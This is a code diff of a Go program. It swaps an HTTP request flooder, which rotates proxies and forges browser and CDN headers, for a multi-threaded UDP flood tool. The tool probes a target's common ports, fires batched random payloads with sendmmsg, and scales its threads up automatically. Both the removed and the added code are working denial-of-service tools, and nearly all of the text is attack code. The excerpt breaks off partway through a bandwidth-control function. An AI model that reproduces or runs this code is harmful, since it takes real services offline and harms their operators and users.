@@ -1,403 +1,484 @@
 package main
- 
+
 import (
 	"bufio"
-	"context"
-	"encoding/json"
 	"flag"
 	"fmt"
-	"io/ioutil"
-	"log"
 	"math/rand"
 	"net"
-	"net/http"
 	"net/url"
 	"os"
 	"os/signal"
+	"runtime"
 	"strings"
 	"sync"
 	"sync/atomic"
 	"syscall"
 	"time"
-	"golang.org/x/net/http2"
-	"github.com/corpix/uarand"
+	"unsafe"
+)
+
+var (
+	LINK      string
+	RATE      int32
+	duration  int
+	THREAD    int
+	SIZE      int
+	VERSI     bool
+	BANDWIT   int
+	b         bool
+	DYNAMIC   bool
+	floodRunning atomic.Bool
+	KIRIM     atomic.Uint64
+	GAGAL     atomic.Uint64
+	openPorts []int
+	payloadPool *sync.Pool
+	activeThreads atomic.Int32
 )
 
 const (
-	RESET  = "\033[1;0m"	 
-	HIJAU  = "\033[1;92m"	 
-	MERAH  = "\033[1;91m"	 
-	KUNING = "\033[1;93m"	 
-	UNGU   = "\033[1;95m"	 
-	CYAN   = "\033[1;96m"	 
+	version = "UDP DIZ FLYZE V5 HYPER PRO MAX"
+	ST      = 1 * time.Second
+	BC      = 2 * time.Second
+	MAX_BOOST = 3.0
+	BATCH_SIZE = 32
 )
-func Putih(text string) string  { return "\033[1;97m" + text + RESET }
-func Hijau(text string) string  { return HIJAU + text + RESET }
-func Merah(text string) string  { return MERAH + text + RESET }
-func Kuning(text string) string { return KUNING + text + RESET }
-func Ungu(text string) string   { return UNGU + text + RESET }
-func Cyan(text string) string   { return CYAN + text + RESET }
 
-type LoadTester struct {
-	Link             string	 
-	numRequests      int64	 
-	concurrency      int	 
-	timeout          time.Duration	 
-	method           string	 
-	headers          map[string]string	 
-	proxies          []string	 
-	successCount     int64	 
-	failureCount     int64	 
-	sentCount        int64	 
-	totalLatency     int64	 
-	lastResponseCode string	 
-	client           *http.Client	 
-}
- 
-func NewLoadTester(  
-	Link string, 	 
-	numRequests int64, 	
-	concurrency int,   
-	timeout time.Duration, 	  
-	method string, 	 
-	headers map[string]string, 	 
-	proxies []string, 
-	 
-) *LoadTester {   
-	var proxyFunc func(*http.Request) (*url.URL, error) 	 	 
-	if len(proxies) > 0 { 	 	
-		proxyFunc = func(req *http.Request) (*url.URL, error) { 				
-			proxyStr := proxies[rand.Intn(len(proxies))]						
-			return url.Parse(proxyStr)						
-		}		
-	}
-	 
-	transport := &http.Transport{
-		Proxy:               proxyFunc,
-		MaxIdleConns:        50000,
-		MaxIdleConnsPerHost: 50000,
-		IdleConnTimeout:     3 * time.Second,
-		TLSHandshakeTimeout: 3 * time.Second,
-		DialContext: (&net.Dialer{
-			Timeout:   3 * time.Second,
-			KeepAlive: 3 * time.Second,		
-			DualStack: true,	
-		}).DialContext,	
-	}
-	
-	if err := http2.ConfigureTransport(transport); err != nil {
-		log.Fatalf("Gagal mengonfigurasi HTTP/2: %v", err)	
-	}
-	client := &http.Client{	
-		Transport: transport,	
-		Timeout:   timeout,
-	}
-	
-	return &LoadTester{
-		Link:         Link,	
-		numRequests:  numRequests,	
-		concurrency:  concurrency,
-		timeout:      timeout,	
-		method:       method,
-		headers:      headers,
-		proxies:      proxies,
-		client:       client,		
-	}
-}
-
-func (lt *LoadTester) sendRequest(ctx context.Context) {
-	startCycle := time.Now()
-	req, err := http.NewRequestWithContext(ctx, lt.method, lt.Link, nil)
-	if err != nil {
-		atomic.AddInt64(&lt.failureCount, 1)		
-		lt.lastResponseCode = "ERROR"				
-		return		
-	}	
-	req.Header.Set("User-Agent", uarand.GetRandom())	
-	for k, v := range lt.headers {		
-		if strings.ToLower(k) == "user-agent" {				
-			continue						
-		}				
-		req.Header.Set(k, v)				
-	}	
-	
-	resp, err := lt.client.Do(req)		
-	lat := time.Since(startCycle)		
-	atomic.AddInt64(&lt.totalLatency, lat.Nanoseconds())		
-	if err != nil {		
-		atomic.AddInt64(&lt.failureCount, 1)				
-		lt.lastResponseCode = "ERROR"				
-		return				
-	}
-		
-	defer resp.Body.Close()		
-	lt.lastResponseCode = fmt.Sprintf("%d", resp.StatusCode)		
-	if resp.StatusCode == 200 {		
-		atomic.AddInt64(&lt.successCount, 1)				
-	} else {
-		atomic.AddInt64(&lt.failureCount, 1)				
-	}		
-}
-
-func (lt *LoadTester) run(ctx context.Context, wg *sync.WaitGroup) {
-	defer wg.Done()
-	sem := make(chan struct{}, lt.concurrency)
-	var inner sync.WaitGroup
-	for i := int64(0); i < lt.numRequests; i++ {
-		select {
-		case <-ctx.Done():
-			break
-		default:
-		}
-		sem <- struct{}{}
-		inner.Add(1)
-		atomic.AddInt64(&lt.sentCount, 1)
-		go func() {
-			defer func() { <-sem; inner.Done() }()
-			lt.sendRequest(ctx)
-		}()
-	}
-	inner.Wait()
-}
-
-func printLogo() {
-	logo := "" +
-		"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣠⣤⣤⣀⡠\n" +
-		"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣧\n" +
-		"⠀⠀⠀⠀⠀⠀⠈⠀⠄⠀⣀⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n" +
-		"⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠈\n" +
-		"⠀⠀⠀⠀⢀⣁⢾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⢋⣭⡍⣿⣿⣿⣿⣿⣿⠐\n" +
-		"⠀⢀⣴⣶⣶⣝⢷⡝⢿⣿⣿⣿⠿⠛⠉⠀⠂⣰⣿⣿⢣⣿⣿⣿⣿⣿⣿⡇\n" +
-		"⢀⣾⣿⣿⣿⣿⣧⠻⡌⠿⠋⠡⠁⠈⠀⠀⢰⣿⣿⡏⣸⣿⣿⣿⣿⣿⣿⣿\n" +
-		"⣼⣿⣿⣿⣿⣿⣿⡇⠁⠀⠀⠐⠀⠀⠀⠀⠈⠻⢿⠇⢻⣿⣿⣿⣿⣿⣿⡟\n" +
-		"⠙⢹⣿⣿⣿⠿⠋⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣿⣿⡿⠟⠁\n" +
-		"⠀⠀⠉⠁															 \n"
-	fmt.Println(logo)
-}
-
-func animate(ctx context.Context, lt *LoadTester, currentCycleDuration time.Duration, summaryDuration time.Duration, interval time.Duration) {
-	syms := []string{"▁", "▃", "▄", "▅", "▇"}
-	idx := 0
-	startCycle := time.Now()
-	ticker := time.NewTicker(interval)
-	defer ticker.Stop()
-	for {
-		select {
-		case <-ctx.Done():
-			return
-		case <-ticker.C:
-			elapsed := time.Since(startCycle)
-			done := atomic.LoadInt64(&lt.successCount) + atomic.LoadInt64(&lt.failureCount)
-			pending := atomic.LoadInt64(&lt.sentCount) - done
-			avgLatency := int64(0)
-			if done > 0 {
-				avgLatency = atomic.LoadInt64(&lt.totalLatency) / done / 1e6
-			}
-			if elapsed >= currentCycleDuration {
-				total := done
-				summary := fmt.Sprintf("%s %s %s %s %s %s %s %s %s %s %s %s",
-				        Putih("\n "),
- 					   Cyan("["),
-					    Putih("SU"),
-					    Cyan("]"),
-                        Cyan("["),
-                        Putih(fmt.Sprintf("%d", int(currentCycleDuration.Seconds()))),
-                        Putih("DE"),
-                        Cyan("]"),
-                        Cyan("["),
-  					  Hijau(fmt.Sprintf("%d", total)),
-                        Putih("RE"),
-                        Cyan("]"),
-		    	)
-				fmt.Println(summary)
-				time.Sleep(summaryDuration)
-				fmt.Print("\033[2A\033[J")
-				currentCycleDuration += 60 * time.Second
-				startCycle = time.Now()
-			} else {
-				remaining := currentCycleDuration - elapsed
-				timerStr := fmt.Sprintf("%02d:%02d", int(remaining.Minutes()), int(remaining.Seconds())%60)
-				line := fmt.Sprintf("%s %s %s %s %s %s %s %s %s %s %s",
-			    	Cyan(syms[idx%len(syms)]),
-			    	Merah("["),
-					Putih("TA"),
-					Merah("]"),
-					Merah("["),
-                    Hijau(timerStr),
-					Merah("]"),
-					Putih("R"),
-					Hijau(fmt.Sprintf("%d", pending)),
-					Putih("A"),
-                    Hijau(fmt.Sprintf("%d", avgLatency)),
-				)
-				idx++
-				fmt.Print("\r" + line)
-			}
-		}
-	}
-}
-
-func loadProxiesFromFile(path string) []string {
-	var proxies []string
-	file, err := os.Open(path)
-	if err != nil {
-		log.Fatalf("Gagal membuka file proxy.txt: %v", err)
-	}
-	defer file.Close()
-	scanner := bufio.NewScanner(file)
-	for scanner.Scan() {
-		line := strings.TrimSpace(scanner.Text())
-		if line != "" {
-			if !strings.Contains(line, "://") {
-				line = "socks5://" + line
-			}
-			proxies = append(proxies, line)
-		}
-	}
-	if err := scanner.Err(); err != nil {
-		log.Fatalf("Gagal membaca file proxy.txt: %v", err)
-	}
-	rand.Shuffle(len(proxies), func(i, j int) { proxies[i], proxies[j] = proxies[j], proxies[i] })
-	return proxies
-}
-
-func fetchProxies(urls []string) []string {
-	var out []string
-	client := &http.Client{Timeout: 3 * time.Second}
-	for _, src := range urls {
-		resp, err := client.Get(src)
-		if err != nil {
-			continue
-		}
-		scanner := bufio.NewScanner(resp.Body)
-		for scanner.Scan() {
-			line := strings.TrimSpace(scanner.Text())
-			if line == "" || strings.HasPrefix(line, "#") {
-				continue
-			}
-			if !strings.Contains(line, "://") {
-				line = "socks5://" + line
-			}
-			out = append(out, line)
-		}
-		resp.Body.Close()
-	}
-	rand.Shuffle(len(out), func(i, j int) { out[i], out[j] = out[j], out[i] })
-	return out
+func init() {
+	flag.StringVar(&LINK, "target", "", "LINK TARGET")
+	flag.IntVar(&duration, "duration", 0, "TIME")
+	flag.IntVar(&THREAD, "threads", 0, "THREAD")
+	flag.IntVar(&SIZE, "size", 0, "UKURAN")
+	flag.BoolVar(&VERSI, "version", false, "VERSION")
+	flag.IntVar(&BANDWIT, "maxbw", 0, "MBPS")
+	flag.BoolVar(&b, "b", true, "FAST MODE")
+	flag.BoolVar(&DYNAMIC, "dynamic", false, "DYNAMIC PAYLOAD")
 }
 
 func main() {
-	rand.Seed(time.Now().UnixNano())
-
-	configPath := flag.String("config", "", "FILE JSON")
-	requestsFlag := flag.Int64("requests", 1000000000, "Total requests")
-	concurrencyFlag := flag.Int("concurrency", 750, "Concurrency")
-	timeoutFlag := flag.Float64("timeout", 2, "Timeout per request (detik)")
-
-	noLive := flag.Bool("no-live", false, "Matikan live output")
+	printBanner()
 	flag.Parse()
 
-	var cfg map[string]interface{}
-	if *configPath != "" {
-		b, _ := ioutil.ReadFile(*configPath)
-		json.Unmarshal(b, &cfg)
+	if VERSI {
+		fmt.Println(version)
+		os.Exit(0)
 	}
 
-	var proxies []string
-	proxies = loadProxiesFromFile("proxy.txt")
-
-reader := bufio.NewReader(os.Stdin)
-fmt.Print("+--[ LINK ] : ")
-link, _ := reader.ReadString('\n')
-link = strings.TrimSpace(link)
-
-if link == "" {
-    fmt.Println(Merah("LINK TIDAK BOLEH KOSONG"))
-    os.Exit(1)
-}
-
-	numReq := *requestsFlag
-	if v, ok := cfg["requests"].(float64); ok {
-		numReq = int64(v)
-	}
-	conc := *concurrencyFlag
-	if v, ok := cfg["concurrency"].(float64); ok {
-		conc = int(v)
-	}
-	timeout := time.Duration(*timeoutFlag * float64(time.Second))
-
-	headers := map[string]string{
-		"Accept":                    "application/json, text/html, application/xhtml+xml, application/xml;q=0.9, image/avif, image/webp, image/apng, */*;q=0.8, application/signed-exchange;v=b3;q=0.9",
-		"Accept-Encoding":           "gzip, deflate, br",
-		"x-forwarded-proto":         "https",
-		"x-requested-with":          "XMLHttpRequest",
-		"cache-control":             "no-cache",
-		"sec-ch-ua":                 "\"Not/A)Brand\";v=\"99\", \"Google Chrome\";v=\"115\", \"Chromium\";v=\"115\"",
-		"sec-ch-ua-mobile":          "?0",
-		"sec-ch-ua-platform":        "Windows",
-		"accept-language":           "en-US,en;q=0.9, fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5, en-US,en;q=0.5",
-		"upgrade-insecure-requests": "1",
-		"Connection":                "Keep-Alive",
-		"Max-Forwards":              "10",
-		"CF-RAY":                    "null",
-		"referer":                   "https://google.com",
-		"sec-fetch-mode":            "navigate, cors",
-		"sec-fetch-dest":            "empty",
-		"sec-fetch-site":            "same-origin",
-		"Access-Control-Request-Method": "GET",
-		"data-return": "false",
-		"dnt": "1",
-		"A-IM": "Feed",
-		"Delta-Base": "12340001",
-		"te": "trailers",
-		"method": "GET",
-		"pragma": "no-cache",
-		"sec-fetch-user": "?1",
-		"Accept-Language":          "en-US,en;q=0.9,id;q=0.8",
-		"CF-IPCountry":             "US",
-		"Via":                      "1.1 google",
-		"Origin":                   "https://www.google.com",
-		"Access-Control-Allow-Origin": "*",
-		"Device-Memory":            "8",
-		"Downlink":                 "10",
-		"ECT":                      "4g",
-		"RTT":                      "50",
-		"Save-Data":                "on",
-		"Viewport-Width":           "1920",
-		"Width":                    "1920",
-		"X-ATT-DeviceId":           "GT-N7100",
-		"X-Wap-Profile":            "http://wap.samsungmobile.com/uaprof/GT-N7100.xml",
-		"X-UIDH":                   "1234567890abcdef",
-		"X-Csrf-Token":             "null",
-		"X-Api-Version":            "1",
-		"X-Client-Data":            "CI22yQEIo7bJAQjEtskBCKmdygEIqKPKAQ==",
+	if LINK == "" {
+		LINK = Logo()
 	}
 
-	fmt.Print("\033[H\033[2J")
-    printLogo()
+	IPT, err := RIP(LINK)
+	if err != nil {
+		fmt.Printf("\nIP Gagal di kompres : %v\n", err)
+		os.Exit(1)
+	}
 
-	lt := NewLoadTester(link, numReq, conc, timeout, "GET", headers, proxies)
-	ctx, cancel := context.WithCancel(context.Background())
-	defer cancel()
+	Config()
+	CekPort(IPT)
+	if len(openPorts) == 0 {
+		openPorts = []int{53, 80, 8080, 123, 443, 1900, 5353, 7547, 111, 137}
+	}
 
-	sigc := make(chan os.Signal, 1)
-	signal.Notify(sigc, syscall.SIGINT, syscall.SIGTERM)
+	payloadPool = &sync.Pool{
+		New: func() interface{} {
+			buf := make([]byte, SIZE)
+			if DYNAMIC {
+				rand.Read(buf)
+			}
+			return buf
+		},
+	}
+	
+	// Pre-warm payload pool
+	for i := 0; i < THREAD*BATCH_SIZE*2; i++ {
+		payloadPool.Put(payloadPool.New())
+	}
+
+	fmt.Printf("\n💉 LINK : %s\n", LINK)
+	fmt.Printf("💉 IP : %s\n", IPT)
+	fmt.Printf("💉 PORT : %v\n", openPorts)
+	fmt.Printf("💉 PAYL : %d \n", SIZE)
+	fmt.Printf("💉 THRD : %d\n", THREAD)
+	fmt.Printf("💉 RATE : %d \n", atomic.LoadInt32(&RATE))
+	fmt.Printf("💉 TIME : %d \n", duration)
+	fmt.Printf("💉 MBPS : %d \n\n", BANDWIT)
+
+	sigChan := make(chan os.Signal, 1)
+	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
+
+	floodRunning.Store(true)
+	go Status()
+
+	if BANDWIT > 0 {
+		go Bndwit()
+	}
+	
+	activeThreads.Store(int32(THREAD))
+	for i := 0; i < THREAD; i++ {
+		go Worker(IPT)
+	}
+	
+	// Thread auto-scaling
 	go func() {
-		<-sigc
-		fmt.Printf("\n%sTERIMA SIG. STOP%s\n", Merah(""), RESET)
-		cancel()
+		for floodRunning.Load() {
+			currentPPS := KIRIM.Load()
+			time.Sleep(5 * time.Second)
+			newPPS := KIRIM.Load()
+			pps := (newPPS - currentPPS) / 5
+			
+			if pps < uint64(atomic.LoadInt32(&RATE))/2 {
+				if activeThreads.Load() < int32(THREAD)*2 {
+					activeThreads.Add(1)
+					go Worker(IPT)
+				}
+			}
+		}
 	}()
 
-	var wg sync.WaitGroup
-	if !*noLive {
-		wg.Add(1)
-		go func() { defer wg.Done(); animate(ctx, lt, 60*time.Second, 2*time.Second, 100*time.Millisecond) }()
+	if duration > 0 {
+		time.AfterFunc(time.Duration(duration)*time.Second, func() {
+			floodRunning.Store(false)
+		})
 	}
 
-	wg.Add(1)
-	go lt.run(ctx, &wg)
+	<-sigChan
+	floodRunning.Store(false)
+	time.Sleep(500 * time.Millisecond)
+	fmt.Println("\n[!] Attack stopped")
+}
 
-	wg.Wait()
-	cancel()
-	fmt.Println("\n" + Hijau(">> SUKSES <<"))
+func Logo() string {
+	reader := bufio.NewReader(os.Stdin)
+	fmt.Print(`⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠂⣠⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⠞⠽⠿⠟⠻⠿⢻⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡤⠒⠋⠉⠁⠀⠀⠀⠀⠀⠀⠈⠙⠓⢦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⠁⠀⢀⣀⣀⡀⠀⠀⠀⠀⢀⣀⣀⣀⡀⠀⠙⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⣼⠋⠀⢠⠞⠉⠀⠀⠈⠙⢦⣴⠟⠉⠀⠀⠀⠙⣧⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⣠⡤⠶⢤⣼⡟⠀⢠⡟⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀⢀⣀⣀⠀⢸⡆⢸⣷⣤⣴⣦⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⣰⡏⣰⠿⠦⣌⣻⠀⢸⡇⣾⣻⡿⣷⠀⠀⠀⠀⠀⢀⣿⣯⣽⣷⣸⡇⠀⣿⣡⠾⠛⢷⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⢿⡆⣿⡀⢾⡟⠁⢀⣸⣿⣷⡿⢿⣿⠀⣠⡤⠤⣄⠘⣿⣿⣹⣿⣿⣧⡀⠙⠓⣶⣤⣾⣸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠻⣞⢷⡾⠁⣰⠟⠉⠉⠿⣷⣿⠟⢺⣥⣤⣤⣼⡆⠙⠻⠿⠟⠀⠉⢻⡆⣤⣿⡞⣣⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠈⠛⣿⡷⣇⠀⠀⠀⠀⣀⠀⠀⠀⠈⠉⠉⠀⠀⢀⣀⠀⠀⠀⠀⣸⡇⣼⡿⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠈⢷⡹⣄⠀⠀⠀⢻⡝⠓⠲⠤⣤⣤⠴⠚⢋⡿⠃⠀⠀⣠⡟⣰⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠈⠳⣝⣦⣀⠀⠀⠙⢶⣞⠉⠙⠋⠉⣹⡟⠁⢀⣠⣴⣿⡞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣤⣄⡀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⣠⠾⠛⠛⠻⠦⠴⣦⣌⠙⠒⠛⣋⣽⠷⠞⠋⠉⠀⠀⠹⣦⠀⠀⠀⠀⠀⠀⠀⠀⢸⠋⠀⠀⠀⠹⡆
+⠀⠀⠀⠀⠀⠀⢀⡼⠋⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠈⢷⡀⠀⠀⠀⠀⠀⠀⠘⣇⠀⠀⠀⠀⡷
+⠀⠀⠀⠀⠀⢀⣾⠁⠀⠀⠀⠀⢠⡀⣠⡶⠖⠒⠒⠒⠒⠲⠦⣀⠀⠰⣤⠀⠀⠀⠀⠀⢳⡄⠀⠀⠀⠀⠀⢠⡿⠀⠀⠀⣴⠇
+⠀⠀⠀⠀⠀⣾⠃⠀⠀⠀⠀⠀⡿⢰⠏⠀⠀⠀⠀⠀⠀⠀⠘⣧⠀⢸⣧⠀⠀⠀⠀⠀⢻⡀⠀⠀⢀⣴⠟⠁⠀⢀⣼⠋⠀
+⠀⠀⠀⠀⢰⡟⠀⠀⠀⠀⠀⢰⠇⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡀⣸⠋⣧⠀⠀⠀⠀⠸⣇⣠⡶⠋⠁⠀⠀⣠⡾⠁⠀⠀
+⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⣼⡀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣷⠇⠀⣹⡄⠀⠀⠀⠀⣿⠁⠀⠀⢀⣠⠾⠋⠀⠀⠀⠀
+⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⢸⢿⣇⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⠟⠛⠛⢯⡇⠀⠀⠀⠀⣿⣧⠤⠞⠋⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⢸⡀⠈⠛⠲⣦⡤⠤⠤⢶⣞⠋⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⣷⣠⠴⠛⠋⠳⣦⣀⣀⣈⡿⠦⣄⣀⢀⣿⠀⠀⠀⠀⠀⢹⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⣿⡇⠀⠀⠀⢰⡖⠒⣿⡙⢧⡀⠀⠀⠀⠈⠉⠁⢀⡴⠋⢉⣿⠿⣤⡄⠀⠀⠀⣸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⣠⢶⠚⣿⢷⠟⢿⡟⠾⠃⠀⠘⢷⣌⣻⡄⠀⠀⠀⠀⢠⣟⣁⣠⠞⠁⠀⢸⣧⠴⢻⣾⢿⡷⠴⢤⡄⠀⠀⠀⠀⠀⠀⠀
+⢸⣟⣭⢽⡏⠀⠀⠀⠀⠀⠀⢀⠀⠘⣿⠉⣿⠀⠀⠀⠀⣿⠋⢹⠋⢠⡄⠀⠀⠀⠀⠈⠁⢸⡿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀
+⠘⢾⡇⠸⣇⠀⢠⡄⠰⣄⠀⠘⣿⡶⡯⠴⠋⠀⠀⠀⠀⠻⢧⣬⣷⣿⠃⠀⣴⠀⠀⣦⢀⣾⠃⠈⣿⠆⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠙⠋⠉⠓⠚⠳⠶⠛⠷⠶⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⠶⠶⠿⠒⠚⠛⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀
+` + version + `
+⼳ : `)
+	input, _ := reader.ReadString('\n')
+	return strings.TrimSpace(input)
+}
+
+func printBanner() {
+	fmt.Print("\033[H\033[2J")
+}
+
+func RIP(target string) (string, error) {
+	if strings.Contains(target, "://") {
+		u, err := url.Parse(target)
+		if err != nil {
+			return "", err
+		}
+		target = u.Hostname()
+	}
+
+	if ip := net.ParseIP(target); ip != nil {
+		return target, nil
+	}
+
+	ips, err := net.LookupIP(target)
+	if err != nil {
+		return "", err
+	}
+
+	for _, ip := range ips {
+		if ipv4 := ip.To4(); ipv4 != nil {
+			return ipv4.String(), nil
+		}
+	}
+	
+	if len(ips) > 0 {
+		return ips[0].String(), nil
+	}
+	
+	return "", fmt.Errorf("no IP found")
+}
+
+func Config() {
+	numCPU := runtime.NumCPU()
+	memStats := &runtime.MemStats{}
+	runtime.ReadMemStats(memStats)
+	totalMemMB := int(memStats.Sys / (1024 * 1024))
+
+	fmt.Printf("\nCPU : %d CORES\nRAM : %d MB\n", numCPU, totalMemMB)
+
+	if THREAD == 0 {
+		THREAD = numCPU * 8
+		if totalMemMB < 2048 {
+			THREAD = numCPU * 4
+		}
+	}
+
+	if SIZE == 0 {
+		SIZE = 1472
+		if totalMemMB < 2048 {
+			SIZE = 1024
+		}
+	}
+
+	baseRate := 25000
+	if numCPU < 4 {
+		baseRate = 15000
+	}
+
+	rate := baseRate * THREAD
+	if BANDWIT > 0 {
+		maxRate := (BANDWIT * 1000000) / (SIZE * 8)
+		if rate > maxRate {
+			rate = maxRate
+		}
+	}
+	atomic.StoreInt32(&RATE, int32(rate))
+}
+
+func CekPort(IPT string) {
+	commonPorts := []int{
+		53, 67, 68, 69, 80, 8080, 123, 137, 138, 161, 
+		500, 514, 520, 1900, 4500, 5353, 11211, 7547, 
+		111, 22, 443, 8443, 1194, 5060, 33434,
+	}
+	results := make(chan int, len(commonPorts))
+	timeout := time.After(2 * time.Second)
+
+	portChecker := func(port int) {
+		target := fmt.Sprintf("%s:%d", IPT, port)
+		conn, err := net.DialTimeout("udp", target, 500*time.Millisecond)
+		if err == nil {
+			conn.Close()
+			results <- port
+		} else {
+			results <- 0
+		}
+	}
+
+	for _, port := range commonPorts {
+		go portChecker(port)
+	}
+
+	for i := 0; i < len(commonPorts); i++ {
+		select {
+		case port := <-results:
+			if port != 0 {
+				openPorts = append(openPorts, port)
+			}
+		case <-timeout:
+			return
+		}
+	}
+}
+
+func ipToBytes(ipStr string) [4]byte {
+	ip := net.ParseIP(ipStr).To4()
+	return [4]byte{ip[0], ip[1], ip[2], ip[3]}
+}
+
+func Worker(IPT string) {
+	runtime.LockOSThread()
+	defer runtime.UnlockOSThread()
+	
+	conn, err := net.ListenPacket("udp", ":0")
+	if err != nil {
+		return
+	}
+	defer conn.Close()
+	
+	rawConn, _ := conn.(*net.UDPConn).SyscallConn()
+	var rawFd int
+	rawConn.Control(func(fd uintptr) {
+		rawFd = int(fd)
+	})
+	
+	// Set socket options
+	syscall.SetsockoptInt(rawFd, syscall.SOL_SOCKET, syscall.SO_REUSEADDR, 1)
+	syscall.SetsockoptInt(rawFd, syscall.SOL_SOCKET, syscall.SO_REUSEPORT, 1)
+	syscall.SetsockoptInt(rawFd, syscall.SOL_IP, syscall.IP_MTU_DISCOVER, syscall.IP_PMTUDISC_DONT)
+	syscall.SetsockoptInt(rawFd, syscall.SOL_SOCKET, syscall.SO_SNDBUF, 1024*1024)
+
+	ipBytes := ipToBytes(IPT)
+	
+	// Pre-calculate addresses
+	addrs := make([]syscall.SockaddrInet4, len(openPorts))
+	for i, port := range openPorts {
+		addrs[i] = syscall.SockaddrInet4{
+			Port: port,
+			Addr: ipBytes,
+		}
+	}
+	
+	// Local random source
+	r := rand.New(rand.NewSource(time.Now().UnixNano()))
+	
+	for floodRunning.Load() {
+		start := time.Now()
+		sent := 0
+		rate := int(atomic.LoadInt32(&RATE)) / int(activeThreads.Load())
+
+		for sent < rate || b {
+			toSend := BATCH_SIZE
+			if !b && sent+toSend > rate {
+				toSend = rate - sent
+			}
+
+			// Prepare batch
+			msgs := make([]syscall.Mmsghdr, toSend)
+			iovecs := make([]syscall.Iovec, toSend)
+			payloads := make([][]byte, toSend)
+
+			for i := 0; i < toSend; i++ {
+				payload := payloadPool.Get().([]byte)
+				if DYNAMIC {
+					r.Read(payload)
+				}
+				payloads[i] = payload
+
+				iovecs[i] = syscall.Iovec{
+					Base: &payload[0],
+					Len:  uint64(len(payload)),
+				}
+
+				addr := &addrs[r.Intn(len(addrs))]
+				msgs[i] = syscall.Mmsghdr{
+					Msg_hdr: syscall.Msghdr{
+						Name:    (*byte)(unsafe.Pointer(addr)),
+						Namelen: uint32(unsafe.Sizeof(*addr)),
+						Iov:     &iovecs[i],
+						Iovlen:  1,
+					},
+				}
+			}
+
+			// Send batch
+			n, err := syscall.Sendmmsg(rawFd, msgs, 0)
+			if err != nil {
+				GAGAL.Add(uint64(toSend))
+			} else {
+				KIRIM.Add(uint64(n))
+				if n < toSend {
+					GAGAL.Add(uint64(toSend - n))
+				}
+			}
+
+			// Return payloads to pool
+			for _, p := range payloads {
+				payloadPool.Put(p)
+			}
+
+			sent += toSend
+			
+			if !floodRunning.Load() {
+				return
+			}
+		}
+
+		elapsed := time.Since(start)
+		if elapsed < time.Second && !b {
+			time.Sleep(time.Second - elapsed)
+		}
+	}
+}
+
+func Bndwit() {
+	const (
+		threshold = 0.85
+		adjustFactor = 0.15
+	)
+	
+	lastTotal := KIRIM.Load()
+	lastTime := time.Now()
+
+	for floodRunning.Load() {
+		time.Sleep(BC)
+		
+		currentTotal := KIRIM.Load()
+		now := time.Now()
+		elapsed := now.Sub(lastTime).Seconds()
+		lastTime = now
+
+		currentBW := float64(currentTotal-lastTotal) * float64(SIZE) * 8 / 1000000 / elapsed
+		lastTotal = currentTotal
+
+		currentRate := atomic.LoadInt32(&RATE)
+		newRate := currentRate
+
+		if BANDWIT > 0 {
+			target := float64(BANDWIT)
+			if currentBW > target*threshold {
+				newRate = int32(float64(currentRate) * (1 - adjustFactor))
+			} else if currentBW < target*(threshold-adjustFactor) {
+				boost := 1 + adjustFactor
